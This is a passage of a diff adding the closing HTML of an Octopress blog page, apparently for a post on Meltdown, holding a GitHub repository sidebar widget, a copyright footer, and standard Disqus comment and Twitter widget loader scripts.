+  <a href="https://github.com/raphaelsc">@raphaelsc</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'raphaelsc',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2020 - Raphael S. Carvalho (a.k.a. utroz) -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'funwithbits';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://funwithbits.net/blog/programmers-guide-to-meltdown/';
+        var disqus_url = 'http://funwithbits.net/blog/programmers-guide-to-meltdown/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
